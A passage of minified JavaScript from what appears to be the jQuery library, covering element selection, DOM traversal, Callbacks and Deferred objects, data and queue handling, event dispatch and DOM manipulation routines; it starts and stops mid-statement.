this;if(r=r||_,"string"==typeof e){if(!(i="<"===e[0]&&">"===e[e.length-1]&&e.length>=3?[null,e,null]:O.exec(e))||!i[1]&&t)return!t||t.jquery?(t||r).find(e):this.constructor(t).find(e);if(i[1]){if(t=t instanceof w?t[0]:t,w.merge(this,w.parseHTML(i[1],t&&t.nodeType?t.ownerDocument||t:s,!0)),x.test(i[1])&&w.isPlainObject(t))for(i in t)m(this[i])?this[i](t[i]):this.attr(i,t[i]);return this}return(n=s.getElementById(i[2]))&&(this[0]=n,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):m(e)?void 0!==r.ready?r.ready(e):e(w):w.makeArray(e,this)}).prototype=w.fn,_=w(s);var k=/^(?:parents|prev(?:Until|All))/,R={children:!0,contents:!0,next:!0,prev:!0};function P(e,t){for(;(e=e[t])&&1!==e.nodeType;);return e}w.fn.extend({has:function(e){var t=w(e,this),r=t.length;return this.filter(function(){for(var e=0;e<r;e++)if(w.contains(this,t[e]))return!0})},closest:function(e,t){var r,i=0,n=this.length,a=[],s="string"!=typeof e&&w(e);if(!C.test(e))for(;i<n;i++)for(r=this[i];r&&r!==t;r=r.parentNode)if(r.nodeType<11&&(s?s.index(r)>-1:1===r.nodeType&&w.find.matchesSelector(r,e))){a.push(r);break}return this.pushStack(a.length>1?w.uniqueSort(a):a)},index:function(e){return e?"string"==typeof e?d.call(w(e),this[0]):d.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(w.uniqueSort(w.merge(this.get(),w(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}}),w.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return b(e,"parentNode")},parentsUntil:function(e,t,r){return b(e,"parentNode",r)},next:function(e){return P(e,"nextSibling")},prev:function(e){return P(e,"previousSibling")},nextAll:function(e){return b(e,"nextSibling")},prevAll:function(e){return b(e,"previousSibling")},nextUntil:function(e,t,r){return b(e,"nextSibling",r)},prevUntil:function(e,t,r){return b(e,"previousSibling",r)},siblings:function(e){return j((e.parentNode||{}).firstChild,e)},children:function(e){return j(e.firstChild)},contents:function(e){return I(e,"iframe")?e.contentDocument:(I(e,"template")&&(e=e.content||e),w.merge([],e.childNodes))}},function(e,t){w.fn[e]=function(r,i){var n=w.map(this,t,r);return"Until"!==e.slice(-5)&&(i=r),i&&"string"==typeof i&&(n=w.filter(i,n)),this.length>1&&(R[e]||w.uniqueSort(n),k.test(e)&&n.reverse()),this.pushStack(n)}});var F=/[^\x20\t\r\n\f]+/g;function B(e){return e}function U(e){throw e}function z(e,t,r,i){var n;try{e&&m(n=e.promise)?n.call(e).done(t).fail(r):e&&m(n=e.then)?n.call(e,t,r):t.apply(void 0,[e].slice(i))}catch(e){r.apply(void 0,[e])}}w.Callbacks=function(e){e="string"==typeof e?function(e){var t={};return w.each(e.match(F)||[],function(e,r){t[r]=!0}),t}(e):w.extend({},e);var t,r,i,n,a=[],s=[],o=-1,u=function(){for(n=n||e.once,i=t=!0;s.length;o=-1)for(r=s.shift();++o<a.length;)!1===a[o].apply(r[0],r[1])&&e.stopOnFalse&&(o=a.length,r=!1);e.memory||(r=!1),t=!1,n&&(a=r?[]:"")},l={add:function(){return a&&(r&&!t&&(o=a.length-1,s.push(r)),function t(r){w.each(r,function(r,i){m(i)?e.unique&&l.has(i)||a.push(i):i&&i.length&&"string"!==A(i)&&t(i)})}(arguments),r&&!t&&u()),this},remove:function(){return w.each(arguments,function(e,t){for(var r;(r=w.inArray(t,a,r))>-1;)a.splice(r,1),r<=o&&o--}),this},has:function(e){return e?w.inArray(e,a)>-1:a.length>0},empty:function(){return a&&(a=[]),this},disable:function(){return n=s=[],a=r="",this},disabled:function(){return!a},lock:function(){return n=s=[],r||t||(a=r=""),this},locked:function(){return!!n},fireWith:function(e,r){return n||(r=[e,(r=r||[]).slice?r.slice():r],s.push(r),t||u()),this},fire:function(){return l.fireWith(this,arguments),this},fired:function(){return!!i}};return l},w.extend({Deferred:function(e){var t=[["notify","progress",w.Callbacks("memory"),w.Callbacks("memory"),2],["resolve","done",w.Callbacks("once memory"),w.Callbacks("once memory"),0,"resolved"],["reject","fail",w.Callbacks("once memory"),w.Callbacks("once memory"),1,"rejected"]],i="pending",n={state:function(){return i},always:function(){return a.done(arguments).fail(arguments),this},catch:function(e){return n.then(null,e)},pipe:function(){var e=arguments;return w.Deferred(function(r){w.each(t,function(t,i){var n=m(e[i[4]])&&e[i[4]];a[i[1]](function(){var e=n&&n.apply(this,arguments);e&&m(e.promise)?e.promise().progress(r.notify).done(r.resolve).fail(r.reject):r[i[0]+"With"](this,n?[e]:arguments)})}),e=null}).promise()},then:function(e,i,n){var a=0;function s(e,t,i,n){return function(){var o=this,u=arguments,l=function(){var r,l;if(!(e<a)){if((r=i.apply(o,u))===t.promise())throw new TypeError("Thenable self-resolution");l=r&&("object"==typeof r||"function"==typeof r)&&r.then,m(l)?n?l.call(r,s(a,t,B,n),s(a,t,U,n)):(a++,l.call(r,s(a,t,B,n),s(a,t,U,n),s(a,t,B,t.notifyWith))):(i!==B&&(o=void 0,u=[r]),(n||t.resolveWith)(o,u))}},c=n?l:function(){try{l()}catch(r){w.Deferred.exceptionHook&&w.Deferred.exceptionHook(r,c.stackTrace),e+1>=a&&(i!==U&&(o=void 0,u=[r]),t.rejectWith(o,u))}};e?c():(w.Deferred.getStackHook&&(c.stackTrace=w.Deferred.getStackHook()),r.setTimeout(c))}}return w.Deferred(function(r){t[0][3].add(s(0,r,m(n)?n:B,r.notifyWith)),t[1][3].add(s(0,r,m(e)?e:B)),t[2][3].add(s(0,r,m(i)?i:U))}).promise()},promise:function(e){return null!=e?w.extend(e,n):n}},a={};return w.each(t,function(e,r){var s=r[2],o=r[5];n[r[1]]=s.add,o&&s.add(function(){i=o},t[3-e][2].disable,t[3-e][3].disable,t[0][2].lock,t[0][3].lock),s.add(r[3].fire),a[r[0]]=function(){return a[r[0]+"With"](this===a?void 0:this,arguments),this},a[r[0]+"With"]=s.fireWith}),n.promise(a),e&&e.call(a,a),a},when:function(e){var t=arguments.length,r=t,i=Array(r),n=u.call(arguments),a=w.Deferred(),s=function(e){return function(r){i[e]=this,n[e]=arguments.length>1?u.call(arguments):r,--t||a.resolveWith(i,n)}};if(t<=1&&(z(e,a.done(s(r)).resolve,a.reject,!t),"pending"===a.state()||m(n[r]&&n[r].then)))return a.then();for(;r--;)z(n[r],s(r),a.reject);return a.promise()}});var G=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;w.Deferred.exceptionHook=function(e,t){r.console&&r.console.warn&&e&&G.test(e.name)&&r.console.warn("jQuery.Deferred exception: "+e.message,e.stack,t)},w.readyException=function(e){r.setTimeout(function(){throw e})};var Y=w.Deferred();function Q(){s.removeEventListener("DOMContentLoaded",Q),r.removeEventListener("load",Q),w.ready()}w.fn.ready=function(e){return Y.then(e).catch(function(e){w.readyException(e)}),this},w.extend({isReady:!1,readyWait:1,ready:function(e){(!0===e?--w.readyWait:w.isReady)||(w.isReady=!0,!0!==e&&--w.readyWait>0||Y.resolveWith(s,[w]))}}),w.ready.then=Y.then,"complete"===s.readyState||"loading"!==s.readyState&&!s.documentElement.doScroll?r.setTimeout(w.ready):(s.addEventListener("DOMContentLoaded",Q),r.addEventListener("load",Q));var H=function(e,t,r,i,n,a,s){var o=0,u=e.length,l=null==r;if("object"===A(r))for(o in n=!0,r)H(e,t,o,r[o],!0,a,s);else if(void 0!==i&&(n=!0,m(i)||(s=!0),l&&(s?(t.call(e,i),t=null):(l=t,t=function(e,t,r){return l.call(w(e),r)})),t))for(;o<u;o++)t(e[o],r,s?i:i.call(e[o],o,t(e[o],r)));return n?e:l?t.call(e):u?t(e[0],r):a},K=/^-ms-/,W=/-([a-z])/g;function V(e,t){return t.toUpperCase()}function q(e){return e.replace(K,"ms-").replace(W,V)}var X=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType};function Z(){this.expando=w.expando+Z.uid++}Z.uid=1,Z.prototype={cache:function(e){var t=e[this.expando];return t||(t={},X(e)&&(e.nodeType?e[this.expando]=t:Object.defineProperty(e,this.expando,{value:t,configurable:!0}))),t},set:function(e,t,r){var i,n=this.cache(e);if("string"==typeof t)n[q(t)]=r;else for(i in t)n[q(i)]=t[i];return n},get:function(e,t){return void 0===t?this.cache(e):e[this.expando]&&e[this.expando][q(t)]},access:function(e,t,r){return void 0===t||t&&"string"==typeof t&&void 0===r?this.get(e,t):(this.set(e,t,r),void 0!==r?r:t)},remove:function(e,t){var r,i=e[this.expando];if(void 0!==i){if(void 0!==t){r=(t=Array.isArray(t)?t.map(q):(t=q(t))in i?[t]:t.match(F)||[]).length;for(;r--;)delete i[t[r]]}(void 0===t||w.isEmptyObject(i))&&(e.nodeType?e[this.expando]=void 0:delete e[this.expando])}},hasData:function(e){var t=e[this.expando];return void 0!==t&&!w.isEmptyObject(t)}};var J=new Z,$=new Z,ee=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,te=/[A-Z]/g;function re(e,t,r){var i;if(void 0===r&&1===e.nodeType)if(i="data-"+t.replace(te,"-$&").toLowerCase(),"string"==typeof(r=e.getAttribute(i))){try{r=function(e){return"true"===e||"false"!==e&&("null"===e?null:e===+e+""?+e:ee.test(e)?JSON.parse(e):e)}(r)}catch(e){}$.set(e,t,r)}else r=void 0;return r}w.extend({hasData:function(e){return $.hasData(e)||J.hasData(e)},data:function(e,t,r){return $.access(e,t,r)},removeData:function(e,t){$.remove(e,t)},_data:function(e,t,r){return J.access(e,t,r)},_removeData:function(e,t){J.remove(e,t)}}),w.fn.extend({data:function(e,t){var r,i,n,a=this[0],s=a&&a.attributes;if(void 0===e){if(this.length&&(n=$.get(a),1===a.nodeType&&!J.get(a,"hasDataAttrs"))){for(r=s.length;r--;)s[r]&&0===(i=s[r].name).indexOf("data-")&&(i=q(i.slice(5)),re(a,i,n[i]));J.set(a,"hasDataAttrs",!0)}return n}return"object"==typeof e?this.each(function(){$.set(this,e)}):H(this,function(t){var r;if(a&&void 0===t)return void 0!==(r=$.get(a,e))?r:void 0!==(r=re(a,e))?r:void 0;this.each(function(){$.set(this,e,t)})},null,t,arguments.length>1,null,!0)},removeData:function(e){return this.each(function(){$.remove(this,e)})}}),w.extend({queue:function(e,t,r){var i;if(e)return t=(t||"fx")+"queue",i=J.get(e,t),r&&(!i||Array.isArray(r)?i=J.access(e,t,w.makeArray(r)):i.push(r)),i||[]},dequeue:function(e,t){t=t||"fx";var r=w.queue(e,t),i=r.length,n=r.shift(),a=w._queueHooks(e,t);"inprogress"===n&&(n=r.shift(),i--),n&&("fx"===t&&r.unshift("inprogress"),delete a.stop,n.call(e,function(){w.dequeue(e,t)},a)),!i&&a&&a.empty.fire()},_queueHooks:function(e,t){var r=t+"queueHooks";return J.get(e,r)||J.access(e,r,{empty:w.Callbacks("once memory").add(function(){J.remove(e,[t+"queue",r])})})}}),w.fn.extend({queue:function(e,t){var r=2;return"string"!=typeof e&&(t=e,e="fx",r--),arguments.length<r?w.queue(this[0],e):void 0===t?this:this.each(function(){var r=w.queue(this,e,t);w._queueHooks(this,e),"fx"===e&&"inprogress"!==r[0]&&w.dequeue(this,e)})},dequeue:function(e){return this.each(function(){w.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var r,i=1,n=w.Deferred(),a=this,s=this.length,o=function(){--i||n.resolveWith(a,[a])};for("string"!=typeof e&&(t=e,e=void 0),e=e||"fx";s--;)(r=J.get(a[s],e+"queueHooks"))&&r.empty&&(i++,r.empty.add(o));return o(),n.promise(t)}});var ie=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,ne=new RegExp("^(?:([+-])=|)("+ie+")([a-z%]*)$","i"),ae=["Top","Right","Bottom","Left"],se=function(e,t){return"none"===(e=t||e).style.display||""===e.style.display&&w.contains(e.ownerDocument,e)&&"none"===w.css(e,"display")},oe=function(e,t,r,i){var n,a,s={};for(a in t)s[a]=e.style[a],e.style[a]=t[a];for(a in n=r.apply(e,i||[]),t)e.style[a]=s[a];return n};function ue(e,t,r,i){var n,a,s=20,o=i?function(){return i.cur()}:function(){return w.css(e,t,"")},u=o(),l=r&&r[3]||(w.cssNumber[t]?"":"px"),c=(w.cssNumber[t]||"px"!==l&&+u)&&ne.exec(w.css(e,t));if(c&&c[3]!==l){for(u/=2,l=l||c[3],c=+u||1;s--;)w.style(e,t,c+l),(1-a)*(1-(a=o()/u||.5))<=0&&(s=0),c/=a;c*=2,w.style(e,t,c+l),r=r||[]}return r&&(c=+c||+u||0,n=r[1]?c+(r[1]+1)*r[2]:+r[2],i&&(i.unit=l,i.start=c,i.end=n)),n}var le={};function ce(e){var t,r=e.ownerDocument,i=e.nodeName,n=le[i];return n||(t=r.body.appendChild(r.createElement(i)),n=w.css(t,"display"),t.parentNode.removeChild(t),"none"===n&&(n="block"),le[i]=n,n)}function de(e,t){for(var r,i,n=[],a=0,s=e.length;a<s;a++)(i=e[a]).style&&(r=i.style.display,t?("none"===r&&(n[a]=J.get(i,"display")||null,n[a]||(i.style.display="")),""===i.style.display&&se(i)&&(n[a]=ce(i))):"none"!==r&&(n[a]="none",J.set(i,"display",r)));for(a=0;a<s;a++)null!=n[a]&&(e[a].style.display=n[a]);return e}w.fn.extend({show:function(){return de(this,!0)},hide:function(){return de(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){se(this)?w(this).show():w(this).hide()})}});var fe=/^(?:checkbox|radio)$/i,he=/<([a-z][^\/\0>\x20\t\r\n\f]+)/i,pe=/^$|^module$|\/(?:java|ecma)script/i,ge={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};function ye(e,t){var r;return r=void 0!==e.getElementsByTagName?e.getElementsByTagName(t||"*"):void 0!==e.querySelectorAll?e.querySelectorAll(t||"*"):[],void 0===t||t&&I(e,t)?w.merge([e],r):r}function ve(e,t){for(var r=0,i=e.length;r<i;r++)J.set(e[r],"globalEval",!t||J.get(t[r],"globalEval"))}ge.optgroup=ge.option,ge.tbody=ge.tfoot=ge.colgroup=ge.caption=ge.thead,ge.th=ge.td;var me,Le,Me=/<|&#?\w+;/;function Te(e,t,r,i,n){for(var a,s,o,u,l,c,d=t.createDocumentFragment(),f=[],h=0,p=e.length;h<p;h++)if((a=e[h])||0===a)if("object"===A(a))w.merge(f,a.nodeType?[a]:a);else if(Me.test(a)){for(s=s||d.appendChild(t.createElement("div")),o=(he.exec(a)||["",""])[1].toLowerCase(),u=ge[o]||ge._default,s.innerHTML=u[1]+w.htmlPrefilter(a)+u[2],c=u[0];c--;)s=s.lastChild;w.merge(f,s.childNodes),(s=d.firstChild).textContent=""}else f.push(t.createTextNode(a));for(d.textContent="",h=0;a=f[h++];)if(i&&w.inArray(a,i)>-1)n&&n.push(a);else if(l=w.contains(a.ownerDocument,a),s=ye(d.appendChild(a),"script"),l&&ve(s),r)for(c=0;a=s[c++];)pe.test(a.type||"")&&r.push(a);return d}me=s.createDocumentFragment().appendChild(s.createElement("div")),(Le=s.createElement("input")).setAttribute("type","radio"),Le.setAttribute("checked","checked"),Le.setAttribute("name","t"),me.appendChild(Le),v.checkClone=me.cloneNode(!0).cloneNode(!0).lastChild.checked,me.innerHTML="<textarea>x</textarea>",v.noCloneChecked=!!me.cloneNode(!0).lastChild.defaultValue;var Ae=s.documentElement,we=/^key/,Ee=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,Se=/^([^.]*)(?:\.(.+)|)/;function De(){return!0}function be(){return!1}function je(){try{return s.activeElement}catch(e){}}function Ce(e,t,r,i,n,a){var s,o;if("object"==typeof t){for(o in"string"!=typeof r&&(i=i||r,r=void 0),t)Ce(e,o,r,i,t[o],a);return e}if(null==i&&null==n?(n=r,i=r=void 0):null==n&&("string"==typeof r?(n=i,i=void 0):(n=i,i=r,r=void 0)),!1===n)n=be;else if(!n)return e;return 1===a&&(s=n,(n=function(e){return w().off(e),s.apply(this,arguments)}).guid=s.guid||(s.guid=w.guid++)),e.each(function(){w.event.add(this,t,n,i,r)})}w.event={global:{},add:function(e,t,r,i,n){var a,s,o,u,l,c,d,f,h,p,g,y=J.get(e);if(y)for(r.handler&&(r=(a=r).handler,n=a.selector),n&&w.find.matchesSelector(Ae,n),r.guid||(r.guid=w.guid++),(u=y.events)||(u=y.events={}),(s=y.handle)||(s=y.handle=function(t){return void 0!==w&&w.event.triggered!==t.type?w.event.dispatch.apply(e,arguments):void 0}),l=(t=(t||"").match(F)||[""]).length;l--;)h=g=(o=Se.exec(t[l])||[])[1],p=(o[2]||"").split(".").sort(),h&&(d=w.event.special[h]||{},h=(n?d.delegateType:d.bindType)||h,d=w.event.special[h]||{},c=w.extend({type:h,origType:g,data:i,handler:r,guid:r.guid,selector:n,needsContext:n&&w.expr.match.needsContext.test(n),namespace:p.join(".")},a),(f=u[h])||((f=u[h]=[]).delegateCount=0,d.setup&&!1!==d.setup.call(e,i,p,s)||e.addEventListener&&e.addEventListener(h,s)),d.add&&(d.add.call(e,c),c.handler.guid||(c.handler.guid=r.guid)),n?f.splice(f.delegateCount++,0,c):f.push(c),w.event.global[h]=!0)},remove:function(e,t,r,i,n){var a,s,o,u,l,c,d,f,h,p,g,y=J.hasData(e)&&J.get(e);if(y&&(u=y.events)){for(l=(t=(t||"").match(F)||[""]).length;l--;)if(h=g=(o=Se.exec(t[l])||[])[1],p=(o[2]||"").split(".").sort(),h){for(d=w.event.special[h]||{},f=u[h=(i?d.delegateType:d.bindType)||h]||[],o=o[2]&&new RegExp("(^|\\.)"+p.join("\\.(?:.*\\.|)")+"(\\.|$)"),s=a=f.length;a--;)c=f[a],!n&&g!==c.origType||r&&r.guid!==c.guid||o&&!o.test(c.namespace)||i&&i!==c.selector&&("**"!==i||!c.selector)||(f.splice(a,1),c.selector&&f.delegateCount--,d.remove&&d.remove.call(e,c));s&&!f.length&&(d.teardown&&!1!==d.teardown.call(e,p,y.handle)||w.removeEvent(e,h,y.handle),delete u[h])}else for(h in u)w.event.remove(e,h+t[l],r,i,!0);w.isEmptyObject(u)&&J.remove(e,"handle events")}},dispatch:function(e){var t,r,i,n,a,s,o=w.event.fix(e),u=new Array(arguments.length),l=(J.get(this,"events")||{})[o.type]||[],c=w.event.special[o.type]||{};for(u[0]=o,t=1;t<arguments.length;t++)u[t]=arguments[t];if(o.delegateTarget=this,!c.preDispatch||!1!==c.preDispatch.call(this,o)){for(s=w.event.handlers.call(this,o,l),t=0;(n=s[t++])&&!o.isPropagationStopped();)for(o.currentTarget=n.elem,r=0;(a=n.handlers[r++])&&!o.isImmediatePropagationStopped();)o.rnamespace&&!o.rnamespace.test(a.namespace)||(o.handleObj=a,o.data=a.data,void 0!==(i=((w.event.special[a.origType]||{}).handle||a.handler).apply(n.elem,u))&&!1===(o.result=i)&&(o.preventDefault(),o.stopPropagation()));return c.postDispatch&&c.postDispatch.call(this,o),o.result}},handlers:function(e,t){var r,i,n,a,s,o=[],u=t.delegateCount,l=e.target;if(u&&l.nodeType&&!("click"===e.type&&e.button>=1))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&("click"!==e.type||!0!==l.disabled)){for(a=[],s={},r=0;r<u;r++)void 0===s[n=(i=t[r]).selector+" "]&&(s[n]=i.needsContext?w(n,this).index(l)>-1:w.find(n,this,null,[l]).length),s[n]&&a.push(i);a.length&&o.push({elem:l,handlers:a})}return l=this,u<t.length&&o.push({elem:l,handlers:t.slice(u)}),o},addProp:function(e,t){Object.defineProperty(w.Event.prototype,e,{enumerable:!0,configurable:!0,get:m(t)?function(){if(this.originalEvent)return t(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[e]},set:function(t){Object.defineProperty(this,e,{enumerable:!0,configurable:!0,writable:!0,value:t})}})},fix:function(e){return e[w.expando]?e:new w.Event(e)},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==je()&&this.focus)return this.focus(),!1},delegateType:"focusin"},blur:{trigger:function(){if(this===je()&&this.blur)return this.blur(),!1},delegateType:"focusout"},click:{trigger:function(){if("checkbox"===this.type&&this.click&&I(this,"input"))return this.click(),!1},_default:function(e){return I(e.target,"a")}},beforeunload:{postDispatch:function(e){void 0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}}},w.removeEvent=function(e,t,r){e.removeEventListener&&e.removeEventListener(t,r)},w.Event=function(e,t){if(!(this instanceof w.Event))return new w.Event(e,t);e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&!1===e.returnValue?De:be,this.target=e.target&&3===e.target.nodeType?e.target.parentNode:e.target,this.currentTarget=e.currentTarget,this.relatedTarget=e.relatedTarget):this.type=e,t&&w.extend(this,t),this.timeStamp=e&&e.timeStamp||Date.now(),this[w.expando]=!0},w.Event.prototype={constructor:w.Event,isDefaultPrevented:be,isPropagationStopped:be,isImmediatePropagationStopped:be,isSimulated:!1,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=De,e&&!this.isSimulated&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=De,e&&!this.isSimulated&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=De,e&&!this.isSimulated&&e.stopImmediatePropagation(),this.stopPropagation()}},w.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,char:!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:function(e){var t=e.button;return null==e.which&&we.test(e.type)?null!=e.charCode?e.charCode:e.keyCode:!e.which&&void 0!==t&&Ee.test(e.type)?1&t?1:2&t?3:4&t?2:0:e.which}},w.event.addProp),w.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,t){w.event.special[e]={delegateType:t,bindType:t,handle:function(e){var r,i=e.relatedTarget,n=e.handleObj;return i&&(i===this||w.contains(this,i))||(e.type=n.origType,r=n.handler.apply(this,arguments),e.type=t),r}}}),w.fn.extend({on:function(e,t,r,i){return Ce(this,e,t,r,i)},one:function(e,t,r,i){return Ce(this,e,t,r,i,1)},off:function(e,t,r){var i,n;if(e&&e.preventDefault&&e.handleObj)return i=e.handleObj,w(e.delegateTarget).off(i.namespace?i.origType+"."+i.namespace:i.origType,i.selector,i.handler),this;if("object"==typeof e){for(n in e)this.off(n,t,e[n]);return this}return!1!==t&&"function"!=typeof t||(r=t,t=void 0),!1===r&&(r=be),this.each(function(){w.event.remove(this,e,r,t)})}});var Ie=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,xe=/<script|<style|<link/i,Ne=/checked\s*(?:[^=]|=\s*.checked.)/i,_e=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;function Oe(e,t){return I(e,"table")&&I(11!==t.nodeType?t:t.firstChild,"tr")&&w(e).children("tbody")[0]||e}function ke(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function Re(e){return"true/"===(e.type||"").slice(0,5)?e.type=e.type.slice(5):e.removeAttribute("type"),e}function Pe(e,t){var r,i,n,a,s,o,u,l;if(1===t.nodeType){if(J.hasData(e)&&(a=J.access(e),s=J.set(t,a),l=a.events))for(n in delete s.handle,s.events={},l)for(r=0,i=l[n].length;r<i;r++)w.event.add(t,n,l[n][r]);$.hasData(e)&&(o=$.access(e),u=w.extend({},o),$.set(t,u))}}function Fe(e,t,r,i){t=l.apply([],t);var n,a,s,o,u,c,d=0,f=e.length,h=f-1,p=t[0],g=m(p);if(g||f>1&&"string"==typeof p&&!v.checkClone&&Ne.test(p))return e.each(function(n){var a=e.eq(n);g&&(t[0]=p.call(this,n,a.html())),Fe(a,t,r,i)});if(f&&(a=(n=Te(t,e[0].ownerDocument,!1,e,i)).firstChild,1===n.childNodes.length&&(n=a),a||i)){for(o=(s=w.map(ye(n,"script"),ke)).length;d<f;d++)u=n,d!==h&&(u=w.clone(u,!0,!0),o&&w.merge(s,ye(u,"script"))),r.call(e[d],u,d);if(o)for(c=s[s.length-1].ownerDocument,w.map(s,Re),d=0;d<o;d++)u=s[d],pe.test(u.type||"")&&!J.access(u,"globalEval")&&w.contains(c,u)&&(u.src&&"module"!==(u.type||"").toLowerCase()?w._evalUrl&&w._evalUrl(u.src):T(u.textContent.replace(_e,""),c,u))}return e}function Be(e,t,r){for(var i,n=t?w.filter(t,e):e,a=0;null!=(i=n[a]);a++)r||1!==i.nodeType||w.cleanData(ye(i)),i.parentNode&&(r&&w.contains(i.ownerDocument,i)&&ve(ye(i,"script")),i.parentNode.removeChild(i));return e}w.extend({htmlPrefilter:function(e){return e.replace(Ie,"<$1></$2>")},clone:function(e,t,r){var i,n,a,s,o,u,l,c=e.cloneNode(!0),d=w.contains(e.ownerDocument,e);if(!(v.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||w.isXMLDoc(e)))for(s=ye(c),i=0,n=(a=ye(e)).length;i<n;i++)o=a[i],u=s[i],l=void 0,"input"===(l=u.nodeName.toLowerCase())&&fe.test(o.type)?u.checked=o.checked:"input"!==l&&"textarea"!==l||(u.defaultValue=o.defaultValue);if(t)if(r)for(a=a||ye(e),s=s||ye(c),i=0,n=a.length;i<n;i++)Pe(a[i],s[i]);else Pe(e,c);return(s=ye(c,"script")).length>0&&ve(s,!d&&ye(e,"script")),c},cleanData:function(e){for(var t,r,i,n=w.event.special,a=0;void 0!==(r=e[a]);a++)if(X(r)){if(t=r[J.expando]){if(t.events)for(i in t.events)n[i]?w.event.remove(r,i):w.removeEvent(r,i,t.handle);r[J.expando]=void 0}r[$.expando]&&(r[$.expando]=void 0)}}}),w.fn.extend({detach:function(e){return Be(this,e,!0)},remove:function(e){return Be(this,e)},text:function(e){return H(this,function(e){return void 0===e?w.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=e)})},null,e,arguments.length)},append:function(){return Fe(this,arguments,function(e){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||Oe(this,e).appendChild(e)})},prepend:function(){return Fe(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=Oe(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return Fe(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return Fe(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(w.cleanData(ye(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null!=e&&e,t=null==t?e:t,this.map(function(){return w.clone(this,e,t)})},html:function(e){return H(this,function(e){var t=this[0]||{},r=0,i=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!xe.test(e)&&!ge[(he.exec(e)||["",""])[1].toLowerCase()]){e=w.htmlPrefilter(e);try{for(;r<i;r++)1===(t=this[r]||{}).nodeType&&(w.cleanData(ye(t,!1)),t.innerHTML=e);t=0}catch(e){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var e=[];return Fe(this,arguments,function(t){var r=this.parentNode;w.inArray(this,e)<0&&(w.cleanData(ye(this)),r&&r.replaceChild(t,this))},e)}}),w.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){w.fn[e]=function(e){for(var r,i=[],n=w(e),a=n.length-1,s=0;s<=a;s++)r=s===a?this:this.clone(!0),w(n[s])[t](r),c.apply(i,r.get());return this.pushStack(i)}});var Ue=new RegExp("^("+ie+")(?!px)[a-z%]+$","i"),ze=function(e){var t=e.ownerDocument.defaultView;return t&&t.opener||(t=r),t.getComputedStyle(e)},Ge=new RegExp(ae.join("|"),"i");function Ye(e,t,r){var i,n,a,s,o=e.style;return(r=r||ze(e))&&(""!==(s=r.getPropertyValue(t)||r[t])||w.contains(e.ownerDocument,e)||(s=w.style(e,t)),!v.pixelBoxStyles()&&Ue.test(s)&&Ge.test(t)&&(i=o.width,n=o.minWidth,a=o.maxWidth,o.minWidth=o.maxWidth=o.width=s,s=r.width,o.width=i,o.minWidth=n,o.maxWidth=a)),void 0!==s?s+"":s}function Qe(e,t){return{get:function(){if(!e())return(this.get=t).apply(this,arguments);delete this.get}}}!function(){function e(){if(c){l.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",c.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",Ae.appendChild(l).appendChild(c);var e=r.getComputedStyle(c);i="1%"!==e.top,u=12===t(e.marginLeft),c.style.right="60%",o=36===t(e.right),n=36===t(e.width),c.style.position="absolute",a=36===c.offsetWidth||"absolute",Ae.removeChild(l),c=null}}function t(e){return Math.round(parseFloat(e))}var 